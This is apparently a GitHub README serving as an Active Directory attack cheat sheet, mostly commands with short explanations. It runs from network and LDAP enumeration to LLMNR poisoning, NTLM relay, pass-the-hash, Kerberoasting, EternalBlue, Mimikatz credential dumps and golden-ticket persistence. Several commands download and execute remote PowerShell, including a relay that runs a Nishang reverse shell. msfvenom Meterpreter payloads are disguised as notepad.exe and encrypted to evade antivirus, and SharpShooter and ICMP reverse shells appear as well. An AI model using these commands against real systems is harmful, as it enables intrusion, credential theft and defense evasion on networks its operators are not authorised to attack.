![active-directory-monitoring](https://user-images.githubusercontent.com/84678370/127057641-382b4592-0b78-4883-b5e0-edae43e22556.png)


* ### Author: __Hiou__

* ### Linkedin: __https://www.linkedin.com/in/xl22glckz__
## Summary
- [__Main__](#Main-Enum)
- [__RID__](#RID)
- [__LDAP__](#LDAP)
- [__SMB__](#SMB)
- [__rpcclient__](#rpcclient)
- [__crackmapexec smb__](#crackmapexec-SMB)
- [__crackmapexec mssql__](#crackmapexec-MSSQL)
- [__bloodhound__](#bloodhound)
- [__Kerberos Enum__](#Kerberos-Enum)
- [__Metasploit Enum__](#Metasploit-Enum)
- [__Metasploit Post__](#Metasploit-Post)
- [__Attack__](#Attack)
- [__LLMNR NBT NS__](#LLMNR)
- [__crackmapexec Attack__](#crackmapexec-Attack)
- [__pth-winexe Pass the Hash__](#pth-winexe-Pass-the-Hash)
- [__psexec__](#psexec)
- [__Evil winrm__](#evil-winrm)
- [__Kerberoasting__](#Kerberoasting)
- [__AS-REP Roasting__](#AS-REP-Roasting)
- [__Spraying The Forest__](#Spraying-The-Forest)
- [__Spray__](#Spray)
- [__EternalBlue__](#EternalBlue)
- [__Nishang__](#Nishang)
- [__Powershell__](#Powershell)
- [__Mimikatz__](#Mimikatz)
- [__SharpShooter__](#SharpShooter)
- [__Strengthens your shell__](#Strengthens-your-shell)
- [__C2 / Command And Control__](#C2-Command-And-Control)

# Main Enum

```
crackmapexec 10.10.10.0/24

nmap -sn 10.10.10.0/24 > ips.txt

nmap -sn -f --min-rate 2000 -10.10.10.0/24 -oN file

nmap -g port -sn -f --min-rate 1000 10.10.10.0/24 -oN file

fping -g -a 192.168.1.0/24 2>/dev/null > ips.txt

nmap -f -sS -p- --open --min-rate 2000 -iL ips.txt -Pn -v -n -oG file

nmap -g port -f -sS -p- --open --min-rate 1000 -iL ips.txt -Pn -v -n -oG allPorts

nmap -sS -sU -p161 --min-rate 2000 -iL ips.txt -Pn -v -n -oN file

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"
```

> ### _RID_
```
impacket-lookupsid username:password@pepe.local

cme smb 10.10.10.0/24 -u username -p 'password' --rid-brute

cme smb 10.10.10.x -u username -p 'password' --rid-brute --obfs

cme smb 10.10.10.x -u users.txt -p passwords.txt --rid-brute

cme smb 10.10.10.0/24 -u users.txt -p passwords.txt --rid-brute --obfs

ridenum <ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
```

> ### _LDAP_
```
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> -oN file

ldapdomaindump -r 10.10.10.x -u pepe.local\\username -p 'password' --authtype SIMPLE --no-json --no-grep

ldapsearch -x -h 10.10.10.x -D '' -w '' -b "DC=pepe.LOCAL"

ldapsearch -x -h 10.10.10.x -D 'pepe.LOCAL\username' -w 'password'

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "DC=pepe,DC=local"

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "CN=Users,DC=pepe,DC=local"
```

> ### _SMB_
```
smbmap -H 10.10.10.x -u invaliduser

smbmap -H 10.10.10.x -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password" -d DOMAIN

smbclient -I 10.10.10.x -L ACTIVE -N -U ""

smbclient //10.10.10.x/share -N -c ls

smbclient -I 10.10.10.x -L ACTIVE -U username

enum4linux -a pepe.local

enum4linux -U -v pepe.local

enum4linux -a -u " " -p " " pepe.local

enum4linux -r pepe.local

enum4linux -r -u "username" -p "password" pepe.local

enum4linux -r -u "username" -p "password" pepe.local 2>/dev/null
```

> ### _rpcclient_
```
rpcclient -U "" 10.10.10.x -c "query" -N

rpcclient -U "username" 10.10.10.x -c "query"

./rpcenum -e 'query' -i 10.10.10.x > file # Example: All
```

> ### _crackmapexec SMB_
```
cme smb 10.10.10.x -u '' -p ''

cme smb 10.10.10.x -u '' -p '' --flag

cme smb 10.10.10.x -u username -p password --flag  #Example: --users --obfs

cme smb 10.10.10.x

cme smb target/s -u /path/users.txt -p /path/passwords.txt

cme smb 10.10.10.0/24 -u 'username' -p 'password'
```

> ### _crackmapexec MSSQL_
```
cme mssql target/s -u /path/users.txt -p /path/passwords.txt

cme mssql 10.10.10.x -u username -p 'password' #--local-auth -q 'SELECT <query> FROM <query>;'  #Check comment
```

> ### _bloodhound_
```
bloodhound-python -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x

python3 bloodhound.py -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x
```

> ### _Kerberos Enum_
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='PEPE.LOCAL'" -Pn ip -v -n -oN users-nmap-recon

nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='PEPE.LOCAL',userdb=/path/usernames.txt ip
```

> ### _Metasploit Enum_
- - https://www.hackingarticles.in/penetration-testing-windows-server-active-directory-using-metasploit-part-1/
- - https://www.hackingarticles.in/penetration-testing-active-directory-using-metasploit-part-2/
- - https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78

----

* systemctl start postgresql
* msfdb init
* db_status

```
use auxiliary/gather/kerberos_enumusers

use auxiliary/scanner/smb/smb_login

use auxiliary/scanner/smb/smb_lookupsid
```

> ### _Metasploit Post_
```
use post/windows/gather/enum_ad_computers

use post/windows/gather/enum_shares

use post/windows/gather/enum_ad_groups

use post/windows/manage/add_user_domain

use post/windows/manage/delete_user

use post/windows/gather/enum_logged_on_users

use post/windows/gather/credentials/gpp

use post/windows/manage/delete_user

use post/windows/gather/enum_services

use post/windows/gather/enum_termserv
```
# Attack

> ### __LLMNR__

> __Here you will see a summary of how network poisoning works and how to launch the attack. I do this so that you do not launch it without knowing what it is doing, since network poisoning can cause damage such as DDos, production stoppage, etc. Remember that your job is also to solve problems and search for information on your own. It is useless to launch an attack if you do not know how it works, so I recommend that you inform yourself well of all the attacks and tools shown here so that you understand at a low level what you are doing, you can have control and do not cause damage.__

> __Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.__

- ((MITM)) Adversaries can spoof an authoritative source for name resolution in a victim network by responding to LLMNR (UDP 5355) / NBT-NS (UDP 137) traffic as if they knew the identity of the requested host, effectively poisoning the service so that victims communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will be sent to the adversary controlled system.

>> __https://attack.mitre.org/techniques/T1557/001/__

- __Poisoning__

- - __Don't poisoning all network__
- - __responder.conf__
- - __responder__
- - __ntlmrelayx__

>> Don't poisoning all network

- __Modify the responder settings to your liking and when using ntlmrelayx, define targets. Poisoning the entire network could cause a denial of service__


>> responder.conf / Default
```
Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

>> responder usage
```
responder -h #Help

responder -I interface -A

responder -I interface -wrf

responder -I interface -rdw

responder -I interface --lm #check help
```

>> responder __NTLM__ / __responder.conf__ / __ntlmrelayx__
```
Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
```

```
impacket-ntlmrelayx -tf targets.txt -smb2support

responder -I interface -rdw
```

---

> ### _crackmapexec_ __Attack__
```
cme smb 10.10.10.x -u 'username' -H 'NTLM hash'

cme smb 10.10.10.x -u 'username' -p 'password' -x command

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' --sam

cme smb 10.10.10.x -u 'username' -p 'password' --sam

cme smb 10.10.10.x -u 'username' -p 'password' -M rdp -o ACTION='enable'

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable' --obfs

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable'

cme smb 10.10.10.x -u username -p 'password' --ntds

cme smb 10.10.10.x -u username -p 'password' --ntds vss

cme smb 10.10.10.x -u username -p password --pass-pol
```

> ### _pth-winexe_ __Pass the Hash__
````
pth-winexe -U PEPE.LOCAL/username%HASH_LM:HASH_NTLM //10.10.10.x cmd.exe
````

> ### _psexec_
````
impacket-psexec pepe.local/username:password@10.10.10.x cmd.exe

impacket-psexec 'username:password@10.10.10.x' cmd.exe

python3 psexec.py pepe.local/username:password@10.10.10.x cmd.exe
````

> ### _evil-winrm_
````
evil-winrm -i 10.10.10.x -u username -p 'password'

evil-winrm -i 10.10.10.x -u username -H 'hash NTLM' #-p port
````

> ### _Kerberoasting_
````
impacket-GetUserSPNs -rquest -dc-ip 10.10.10.x blackfield.local/username

./kerbrute userenum --dc ip -d PEPE.local users.txt
````

> ### _AS-REP Roasting_
````
impacket-GetNPUsers -format <format> PEPE.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.x -outputfile hashes.txt #format Example: john

impacket-GetADUsers -all -dc-ip 10.10.10.x PEPE.LOCAL/username
````

> ## _Spraying The Forest_

- __Warning Password Spraying__
* __https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-password-spray__
> __When you decide to do a Spraying Attack, you should keep in mind that the policies lock accounts when you reach a certain number of brute force attempts.__

----

----

> ### _Spray_
* __https://github.com/Greenwolf/Spray__

````
/spray.sh -smb ip users-file creds-file <attempts> <minutes> pepe.local

/spray.sh -smb 10.10.10.x users creds 3 20 pepe.local
````

> ## _EternalBlue_
* __https://www.elladodelmal.com/2020/07/modulo-de-eternalblue-doublepulsar-en.html__
* __https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010__
* __https://support.redborder.com/hc/en-us/articles/360000999778-Use-Case-1-Eternalblue-Attack__
* __https://support.redborder.com/hc/en-us/articles/360000999878-Use-case-2__
* __https://es.wikipedia.org/wiki/EternalBlue__
* __https://www.avast.com/c-eternalblue__
* __https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/__
* __https://research.checkpoint.com/2017/eternalblue-everything-know/__

----

* * __https://github.com/worawit/MS17-010__
* * __https://github.com/3ndG4me/AutoBlue-MS17-010__
* * __Manual-Recon__
* * __zzz Exploit__
* * __AutoBlue__
* * __Metasploit-Recon__
* * __Metasploit-Exploit__

>> _Manual-Recon_
````
nmap --script smb-vuln-ms17-010 -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap --script "vuln" -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap --script "vuln and safe" -p445 -Pn -v -n 10.10.10.x -oN file-name

nmap -g 443 -f -sS --script "vuln and safe" -Pn -p445 -v -n 10.10.10.x -oN file-name

nmap -g 443 -f -sS --min-rate 1000 --script "vuln and safe" -p445 -Pn -v -n 10.10.10.x -oN file-name
````

>> _zzz Exploit_

* __Default_Conf__
````python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()

	print('creating file c:\\pwned.txt on the target')  <--- This obviously we do not want to do
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)

    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <---
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
````

* __MOD_Conf__

````python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()

	#print('creating file c:\\pwned.txt on the target')  <--- Comment this
	#tid2 = smbConn.connectTree('C$')
	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
	#smbConn.closeFile(tid2, fid2)
	#smbConn.disconnectTree(tid2)

    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') <--- Here define what you want to do
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
````

````
python3 checker.py 10.10.10.x

python zzz_exploit.py 10.10.10.x <pipe>
````

>> _AutoBlue_
````
apt-get install rlwrap

cd shellcode

./shell_prep.sh

rlwrap nc -nlvp port

rlwrap nc -nlvp port

python3 eternalblue_exploit7.py 10.10.10.x <shellcode_file>
````

>> _Metasploit-Recon_
````
use auxiliary/scanner/smb/smb_ms17_010
````

>> _Metasploit-Exploit_
````
use exploit/windows/smb/ms17_010_eternalblue
````

> ### __Nishang__

* * Nishang
* * Powershell

> _As Nishang says in his Github repository (a very interesting repository) his scripts are tags as malicious, which makes it very difficult for an antivirus to let them touch the "disk", that is why the "memory injection" method is used for Powershell._

* * __https://github.com/samratashok/nishang__

* * __Nishang With Ntlmrelayx__

>> _responder.conf_

````
[Responder Core]

; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
````

>> _Nishang Shell Conf_

* __Open Powershelltcp.ps1 and at the end, paste this (change ip and port)__

* * Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port

````Powershell
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port # <--- Here
````

>> _Python3 Simple Server_
````
python3 -m http.server port
````

>> _Listener_
````
rlwrap nc -nlvp port
````

>> _responder On_
````
responder -I interface -rdw
````

>> _ntlmrelayx Nishang_
````
impacket-ntlmrelayx -tf target-file -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ip:port/PowerShellTcp.ps1')" -smb2support
````
---

> # __Powershell__
- __https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1__
- __https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon__
- __https://www.pentesteracademy.com/course?id=21__
- __https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf__
- __https://www.varonis.com/blog/powershell-for-pentesters/__
- __https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/?view=powershell-7.1__
- __https://gist.github.com/HarmJ0y/3328d954607d71362e3c__

### __Process Architecture__
```Powershell
[Environment]::is64bitoperatingSystem

[Environment]::is64bitprocess

powershell.exe [Environment]::is64bitprocess > output.txt

powershell.exe [Environment]::is64bitprocess > /path/to/file.txt
```

### __Powerview Recon__
> You must first download the PowerView on your machine and then transfer it to the victim machine. Above I have left two links that redirect to the PowerShellMafia github.
```
.\PowerView.ps1
```
```Powershell
Get-NetUser

Get-NetUser "pepe"

Get-NetGroup

Get-NetDomain

Get-NetDomain -Domain "Pepe.com"

Get-NetComputer

Get-NetComputer -Unconstrained

Get-NetComputer –OperatingSystem "os"
```
```Powershell
Get-DomainSID

Get-DomainPolicy

Get-DomainPolicy -Domain pepe.local -DomainController <DC>

Get-DomainController

Get-DomainDNSZone

Get-DomainDNSrecord
```
```Powershell
Invoke-UserHunter -ShowAll

Invoke-UserHunter -Unconstrained -ShowAll
```
```Powershell
Get-ADUserResultantPasswordPolicy

Get-ADUserResultantPasswordPolicy -Identity pepe
```

> # __Mimikatz__
- __https://github.com/gentilkiwi/mimikatz/releases__
- __https://github.com/gentilkiwi/mimikatz/wiki__
- __https://www.varonis.com/blog/what-is-mimikatz/__
- __https://adsecurity.org/?page_id=1821__
- __https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN__
- __https://docs.microsoft.com/es-es/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type?redirectedfrom=MSDN__
- __https://attack.mitre.org/software/S0002/__

>  Mimikatz is an open source program used by penetration testers to steal credentials in Windows. Let's say it's a Swiss army knife for windows, very good and recommended.

* * Mimikatz Dumps
> With mimikatz, we can attack critical parts, such as dump NTLM, cleartext-passwords, kerberos tickets, etc... I will leave some links so that you can study more in depth the operation of this tool.

* * NTLM SAM file hashes dump

> First of all, it wouldn't hurt to look at the architecture to know that you are in the right process, to avoid false positives at post-exploitation time.
```
.\mimikatz.exe
```

```
privilege::debug
token::elevate
lsadump::sam
```

![mimikatz](https://user-images.githubusercontent.com/84678370/129926509-8ac2f0b8-1953-4152-a011-102bb268dfed.png)

### __privilege::debug__

- - __https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege__
- - __https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege?redirectedfrom=MSDN__

> The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to. For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system.

### __token::elevate__

- - __https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#token__
- - __https://docs.microsoft.com/es-es/windows/win32/secauthz/impersonation-tokens__

> Impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box.

### __lsadump::sam__

- - __https://adsecurity.org/?page_id=1821#LSADUMPSAM__
- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection__
- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/whats-new-in-credential-protection__

> Get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer, great.

---

## __Golden Ticket__
- __https://docs.microsoft.com/es-es/defender-for-identity/domain-dominance-alerts__
- __https://attack.mitre.org/techniques/T1558/001/__
- __https://attack.mitre.org/mitigations/M1026/__
- __https://attack.mitre.org/tactics/TA0006/__
- __https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/__
- __https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/__
- __https://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos__

> Adversaries who have the KRBTGT account password hash can forge Kerberos ticket-granting tickets (TGTs), also known as golden tickets. Golden tickets allow adversaries to generate authentication material for any Active Directory account. Ultimately, it can be used for the persistence phase in the forest, large, for example, to impersonate the Domain Administrator for 10 years or the specified period.

> The first thing to do is to get the hashes of the krbtgt account.

- __https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1__

> To execute this attack, we have to be in the domain as a domain administrator user.

> The next way to load it into memory is if we have internet access, otherwise we would have to load it in another way.
* * In-Memory
```Powershell
IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")))
```

* * In-Memory Another way
```
python3 -m http.server
```

```Powershell
IEX(New-Object system.Net.WebClient).downloadString('http://ip:port/Invoke-Mimikatz.ps1')
```

* * Dump
```Powershell
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
```

* * Gold-Ticket
```Powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:pepe.local /sid:S-1-5... /rc4:<NTLM> /user:Administrator /ticket:gold.kirbi"'
```
* * Pesistence-Gold.kirbi

![image](https://user-images.githubusercontent.com/84678370/129996058-d9aa82e5-6ecb-4e27-9be3-3711fdb8eb3e.png)

> It is clear that we cannot list the DC files. It would be bad enough if we could without any permissions. This is where our precious mimikatz & gold.kirbi comes in.

```
mimikatz.exe
```

```
kerberos::ptt gold.kirbi

exit
```

![image](https://user-images.githubusercontent.com/84678370/129995781-d88fad4c-f0ec-4457-bbc6-3abb0c7543ca.png)

### __Persistence-Ticketer__

- __https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py__

> This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, extrasids, etc. Tickets duration is fixed to 10 years from now (although you can manually change it)

```
impacket-ticketer -nthash <ntlm> -domain-sid S-1-5-2... -domain pepe.local Administrador
```
> On our machine (I say this just in case) we have to specify to an environment variable (KRB5CCNAME) the absolute path where Ticketer has saved the Administrator.ccache file.

```
export KRB5CCNAME="/path/to/file.ccache"
```

> The surprising thing after this, is that no matter how much the Administrator user changes the password, it is not going to do him any good, since we can even do persistence with psexec without providing the password.

```
impacket-psexec -k -n pepe.local/Administrator@DC-NAME cmd.exe
```
![Ticketer](https://user-images.githubusercontent.com/84678370/129994100-20be12cd-b95d-4c97-8a2c-8e528a7a55df.png)

#### Add DC-NAME to your etc/hosts

---

# SharpShooter

> __SharpShooter__ is a `payload` creation framework for the `retrieval` and `execution` of arbitrary `CSharp` `source` `code`. SharpShooter is capable of creating payloads in a variety of `formats`, including `HTA`, `JS`, `VBS` and `WSF`. It leverages `James Forshaw's` `DotNetToJavaScript` tool to `invoke` methods from the SharpShooter `DotNet` `serialised` `object`. Payloads can be retrieved using `Web` or `DNS` delivery or both; SharpShooter is compatible with the `MDSec` `ActiveBreach` `PowerDNS` project. Alternatively, `stageless` payloads with `embedded` `shellcode` execution can also be generated for the same scripting formats.

- - __https://github.com/mdsecactivebreach/SharpShooter__

* * __git Install__
```
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git

cd SharpShooter/

sudo pip install -r requirements.txt
```
* * SharpShooter Payload
> __SharpShooter__ payloads are `RC4 encrypted` with a `random` `key` to provide some modest anti-virus `evasion`, and the project includes the capability to integrate `sandbox` detection and environment `keying` to assist in evading `detection`.

```
usage: SharpShooter.py [-h] [--stageless] [--dotnetver <ver>] [--com <com>]
                       [--awl <awl>] [--awlurl <awlurl>] [--payload <format>]
                       [--sandbox <types>] [--amsi <amsi>] [--delivery <type>]
                       [--rawscfile <path>] [--shellcode] [--scfile <path>]
                       [--refs <refs>] [--namespace <ns>] [--entrypoint <ep>]
                       [--web <web>] [--dns <dns>] [--output <output>]
                       [--smuggle] [--template <tpl>]

optional arguments:
  -h, --help          show this help message and exit
  --stageless         Create a stageless payload
  --dotnetver <ver>   Target .NET Version: 2 or 4
  --com <com>         COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote
  --awl <awl>         Application Whitelist Bypass Technique: wmic, regsvr32
  --awlurl <awlurl>   URL to retrieve XSL/SCT payload
  --payload <format>  Payload type: hta, js, jse, vba, vbe, vbs, wsf
  --sandbox <types>   Anti-sandbox techniques:
                      [1] Key to Domain (e.g. 1=CONTOSO)
                      [2] Ensure Domain Joined
                      [3] Check for Sandbox Artifacts
                      [4] Check for Bad MACs
                      [5] Check for Debugging
  --amsi <amsi>       Use amsi bypass technique: amsienable
  --delivery <type>   Delivery method: web, dns, both
  --rawscfile <path>  Path to raw shellcode file for stageless payloads
  --shellcode         Use built in shellcode execution
  --scfile <path>     Path to shellcode file as CSharp byte array
  --refs <refs>       References required to compile custom CSharp,
                      e.g. mscorlib.dll,System.Windows.Forms.dll
  --namespace <ns>    Namespace for custom CSharp,
                      e.g. Foo.bar
  --entrypoint <ep>   Method to execute,
                      e.g. Main
  --web <web>         URI for web delivery
  --dns <dns>         Domain for DNS delivery
  --output <output>   Name of output file (e.g. maldoc)
  --smuggle           Smuggle file inside HTML
  --template <tpl>    Name of template file (e.g. mcafee)
```
> Use msfvenom to generate our `Meterpreter` `reverse` `stager` and write the raw output format to a file.
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=port -f raw -o /Path/to/file.txt 
```
> Sharp-Payload
```
sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /Path/to/file.txt --output test
```
* * Payload
> Specify format

* * dotnetver

> Target `.NET` Version: 2 or 4

* * stageless

- __https://buffered.io/posts/staged-vs-stageless-handlers/__

> Create a `stageless` payload

* * rawscfile

> Path to raw shellcode file for stageless payloads

---

### __SharpShooter Fix Jsmin Error__

![image](https://user-images.githubusercontent.com/84678370/130304854-5d9de475-6753-459f-90c6-afb87406830d.png)

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
pip2 install --upgrade setuptools
pip2 install jsmin
```
![SHARP](https://user-images.githubusercontent.com/84678370/130305016-5896e7ba-df00-4d2d-aca0-42c63ab81785.png)

---
# __Strengthens your shell__
- __https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/__
- __https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/__
- __https://explainshell.com/__
- __https://tryhackme.com/room/introtoshells__
- __https://www.offensive-security.com/metasploit-unleashed/msfvenom/__
- __https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates__
- __https://www.blackhillsinfosec.com/advanced-msfvenom-payload-generation/__

> In this module, we will see how to launch several types of shell, the objective is that you learn that there is not only a shell with netcat, there are also several types, more `"secure"` and that pass more `"unnoticed"` in the network.

## __Template / Reverse Shell__

> Well, let's start by seeing how to create a simple shell with a `encoder` and a `template` with `msfvenom`.

#### `Template flag`

```
-x, --template  /  Specify a custom executable file to use as a template
```

> The first thing to do is to think about what template we can use to go a little more unnoticed.

#### `Why A Template ?`

> Some time that an `exe` payload created with `msfvenom` can leverage an alternate template EXE file and be `encrypted` to better `evade` defenses.

> For this demonstration we will use the notepad template or `notepad.exe`.

#### `Copy`

```powershell
cd C:\Windows\system32\
```

```powershell
copy notepad.exe C:\Path\To\notepad.exe
```

> We transfer it to our `attacking` machine and proceed to create our `executable`.

#### `msfvenom`

```
msfvenom --list encoders
```

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -e x64/xor_dynamic -x /path/to/notepad.exe -f exe -o /path/to/Notepad.exe
```

---

## __Encrypted Shell With Msfvenom__

- - __https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/__


> `Encryption` is one of those things that in some cases can evade antivirus `static` scanning, because the AV engine cannot decrypt it right away.


#### `List Encrypt`

```
msfvenom --list encrypt
```

```
AES256-CBC
RC4 
XOR 
Base64
```

#### `Combining pieces`

> Well, we could use `RC4` and that's it, but we'd better `combine` the parts, besides the `encryption` method, we'll also use the `x64/zutto_dekiru` encoder and a `template`.

> In fact, we have not used the `x86/shikata_ga_nai` `polymorphic` `encoder`, because we are working on a `64-bit` `process`.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -e x64/zutto_dekiru -x /path/to/notepad.exe --encrypt RC4 --encrypt-key aajsajdajdajdz -f exe -o /path/to/Notepad.exe
```

![notepad](https://user-images.githubusercontent.com/84678370/131216807-b02e788d-663c-40a3-ab13-f34518fdb649.png)

> But we can see that in `Proccess Hacker` it is not as nice as it looks in the other picture 

![Process-1](https://user-images.githubusercontent.com/84678370/131216907-e0f015bb-0807-4726-a1c2-7f8bce8e6d3c.png)

`Original Proccess`

![Process-2](https://user-images.githubusercontent.com/84678370/131216926-2605f0be-9614-4c1c-a279-32b3e9e601a1.png)

> Some of the `AV` out there are not good at scanning `statically` encrypted shellcode. But `runtime` `monitoring` is still a strong line of defense, which means that it is easy to get caught after `decrypting` and running it.



## __Simple ICMP SHELL__
- - __https://linuxhint.com/install_powershell_ubuntu/__
- - __https://github.com/Hackplayers/ReverseShell/blob/master/shell-reverse.ps1__
- - __https://backtrackacademy.com/articulo/simple-reverse-icmp-shell__
- - __https://www.hackplayers.com/2012/10/icmpsh-o-como-abrir-un-shell-inverso-por-ICMP.html__
- - __https://resources.infosecinstitute.com/topic/icmp-reverse-shell/__
- - __https://github.com/Hackplayers/ReverseShell__


> Normally, in a well `"sanitized"` environment, there are `firewalls`, `IPS`, `IDS`, etc. .... believe it or not, there are companies that do use them, and it may be that giving you a reverse shell on the `TCP` protocol is difficult or impossible, but what about `ICMP`? (Not to mention UDP), well yes, let's see what we can do with this simple protocol, which can leave a company `out of the game`.

> For this test we will be using the `hackplayers` repo.

---

`sysctl`

> `Ignore` the `ICMP` traffic `echos`

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

`Python Script`

- - __https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py__

> Here we are indicating which is our attacker's ip and the victim's ip, to `"listen"` to those traces traveling through icmp

```
python2.7 icmpsh_m.py <Source Ip> <Victim ip>
```

![ICMP2](https://user-images.githubusercontent.com/84678370/131572547-9d11e942-dfc1-4834-a9b2-72e3cc8fc6f2.png)


`Generate Powershell Command`

> Once you have the `shell-reverse.ps1` script on your machine and having `powershell` installed on our machine, let's generate our command to launch a simple reverse shell over icmp.

`Powershell Kali`

```
sudo apt-get install powershell
```

```
pwsh
```
`Generate Payload & obtain a session`

```powershell
./shell-reverse.ps1 -lhost <ip> -PowershellICMP -web
```

![ICMP1](https://user-images.githubusercontent.com/84678370/131576177-37f6bd4b-132f-4b91-ac8d-f6db3dac3dd0.png)


> Copy the first payload to windows victim and launch it with `powershell`


![ICMP4](https://user-images.githubusercontent.com/84678370/131583001-62ce7682-5097-4426-a823-1f87644e7b61.png)

![ICMP3](https://user-images.githubusercontent.com/84678370/131582967-5cb5b7f1-3a95-4613-9cce-7803ae28fe6d.png)


> I have removed the `-win` `hidden` parameters just to know that it is connecting correctly, but you can leave them without problems (it would be the right thing to do).

---

# __C2 Command And Control__

- __https://www.varonis.com/blog/what-is-c2/__
- __https://searchsecurity.techtarget.com/feature/Command-and-control-servers-The-puppet-masters-that-govern-malware__
- __https://www.paloaltonetworks.com/cyberpedia/command-and-control-explained__

